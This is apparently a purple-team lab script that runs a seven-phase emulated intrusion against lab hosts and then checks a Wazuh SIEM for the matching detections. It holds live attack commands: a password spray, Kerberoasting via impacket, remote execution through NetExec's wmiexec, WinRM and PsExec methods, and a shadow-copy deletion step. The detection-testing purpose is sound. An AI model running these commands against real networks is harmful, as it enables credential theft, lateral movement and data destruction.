#!/usr/bin/env bash
# ===========================================================================
# run-scenario.sh — one end-to-end adversary emulation across the whole lab.
#
# Walks a realistic 7-phase intrusion, initial access → impact, driving the
# attacks the lab already has and mapping each to the detection that should fire.
# The point isn't the individual techniques (each has its own writeup) — it's
# proving the lab detects a *chained* intrusion end to end, the way a real SOC
# sees a campaign, not a pile of isolated alerts.
#
# Run from atk-01 (REDTEAM) with the lab up (networking+ad+soc+services+attack).
# Attacks that need a credential read it from the environment; missing prereqs
# are skipped loudly rather than aborting the narrative.
#
#   SPRAY_PW=Summer2026 ADMIN_USER=... ADMIN_PW=... ./run-scenario.sh
#   ./run-scenario.sh --verify        # only run the detection scorecard
#
# The scorecard SSHes to siem-01 and greps alerts.log for every expected rule id,
# printing a DETECTED/MISSED matrix — the "did the lab catch the whole chain?" view.
# ===========================================================================
set -u

# --- targets (match docs/00-ip-plan.md) ---
DMZ_WEB="${DMZ_WEB:-http://10.10.20.10:3000}"
DC="${DC:-10.10.10.10}"
WS="${WS:-10.10.10.50}"
FS_HOST="${FS_HOST:-fs-01}"
SIEM_HOST="${SIEM_HOST:-siem-01}"
DOMAIN="${DOMAIN:-lab.internal}"
SPRAY_USER="${SPRAY_USER:-svc-sql}"
SPRAY_PW="${SPRAY_PW:-Summer2026}"
ADMIN_USER="${ADMIN_USER:-}"
ADMIN_PW="${ADMIN_PW:-}"
HERE="$(cd "$(dirname "$0")" && pwd)"

# Every phase records the rule ids it should light up, for the scorecard.
EXPECT_RULES=()
phase() { printf '\n\033[1;36m══ %s ══\033[0m\n' "$*"; }
step()  { printf '  \033[1m→\033[0m %s\n' "$*"; }
note()  { printf '    expect: %s\n' "$*"; EXPECT_RULES+=("$1"); }
have()  { command -v "$1" >/dev/null 2>&1; }
skip()  { printf '    \033[33m[skip]\033[0m %s\n' "$*"; }

run_attacks() {
  phase "Phase 1 — Initial Access: web attack on the DMZ (T1190)"
  step "sqlmap/nikto/curl against Juice Shop"
  if [ -x "$HERE/../web-attacks/web-attack-scan.sh" ]; then
    TARGET="$DMZ_WEB" bash "$HERE/../web-attacks/web-attack-scan.sh" >/dev/null 2>&1 || true
  else skip "web-attack-scan.sh not found"; fi
  note "100440" "DMZ web attack (Suricata 9100020-24 -> Wazuh 100440/100442)"

  phase "Phase 2 — Discovery: enumerate from a foothold (T1016/T1057/T1082/T1087.002)"
  if have nxc && [ -n "$ADMIN_PW" ]; then
    nxc smb "$WS" -u "$ADMIN_USER" -p "$ADMIN_PW" -x 'ipconfig /all & tasklist & systeminfo & net group /domain' >/dev/null 2>&1 || true
  else skip "needs an admin cred on ws-01 (ADMIN_USER/ADMIN_PW); purple-team.py covers this battery offline"; fi
  note "100100" "discovery battery (100100-100113 / Sigma 100502-100510)"

  phase "Phase 3 — Credential Access: spray + kerberoast + LSASS (T1110.003/T1558.003/T1003.001)"
  if have nxc; then
    step "password spray (returns $SPRAY_USER on a lab-weak cred)"
    nxc smb "$DC" -u "$SPRAY_USER" -p "$SPRAY_PW" >/dev/null 2>&1 || true
  else skip "NetExec not installed"; fi
  note "100401" "password spray burst (T1110.003)"
  step "Kerberoast the service SPNs"
  have impacket-GetUserSPNs && impacket-GetUserSPNs "$DOMAIN/$SPRAY_USER:$SPRAY_PW" -request >/dev/null 2>&1 || skip "impacket GetUserSPNs"
  note "100031" "Kerberoasting (T1558.003); honeytoken 100420 if the decoy SPN is hit"
  step "LSASS dump via comsvcs (run lsass-dump.ps1 on ws-01)"
  note "100525" "LSASS comsvcs MiniDump (T1003.001) — run credential-access/lsass-dump.ps1 on ws-01"

  phase "Phase 4 — Lateral Movement: WMI / WinRM / PsExec (T1047/T1021.006/T1569.002)"
  if have nxc && [ -n "$ADMIN_PW" ]; then
    for m in wmiexec winrm psexec; do
      step "nxc --exec-method $m -> ws-01"
      nxc smb "$WS" -u "$ADMIN_USER" -p "$ADMIN_PW" --exec-method "$m" -x whoami >/dev/null 2>&1 || true
    done
  else skip "needs an admin cred on ws-01 (ADMIN_USER/ADMIN_PW)"; fi
  note "100513" "PsExec/WMI/WinRM (Sigma 100513-100516)"

  phase "Phase 5 — Collection: stage data into an archive (T1560.001)"
  step "run '7z a stage.zip <data>' or Compress-Archive on ws-01"
  note "100517" "archive staging (Sigma 100517-100519)"

  phase "Phase 6 — Exfiltration: DNS tunnel out to REDTEAM (T1048.003)"
  step "run an iodine tunnel fs-01 -> atk-01 (see phase-6-nsm/dns-tunneling.md)"
  note "9100010" "DNS tunneling (Suricata 9100010); C2 beacon 9100002"

  phase "Phase 7 — Impact: recovery inhibition + ransomware + malware drop (T1490/T1486)"
  step "vssadmin delete shadows /all /quiet  (on ws-01)"
  note "100520" "inhibit recovery (Sigma 100520-100524)"
  step "encrypt the fs-01 canary + drop EICAR into the share"
  note "100430" "ransomware canary (T1486, 100430/100431)"
  note "100460" "YARA malware match on the share (T1204.002, 100460)"
}

scorecard() {
  phase "Detection scorecard — grepping $SIEM_HOST alerts.log"
  local hits misses=0
  for rid in "${EXPECT_RULES[@]}"; do
    if ssh "$SIEM_HOST" "sudo grep -q \"rule.*id.*$rid\\|($rid)\" /var/ossec/logs/alerts/alerts.log" 2>/dev/null; then
      printf '  \033[32m[DETECTED]\033[0m rule %s\n' "$rid"; hits=$((${hits:-0}+1))
    else
      printf '  \033[31m[ MISSED ]\033[0m rule %s\n' "$rid"; misses=$((misses+1))
    fi
  done
  printf '\n  %s of %s kill-chain stages detected\n' "${hits:-0}" "${#EXPECT_RULES[@]}"
  [ "$misses" -eq 0 ] && printf '  \033[32mFull-chain detection: PASS\033[0m\n'
}

if [ "${1:-}" = "--verify" ]; then
  # rebuild the expected list without launching attacks
  run_attacks() { :; }  # no-op guard (kept for symmetry)
  # populate EXPECT_RULES by tagging only
  EXPECT_RULES=(100440 100100 100401 100031 100525 100513 100517 9100010 100520 100430 100460)
  scorecard
  exit 0
fi

run_attacks
scorecard
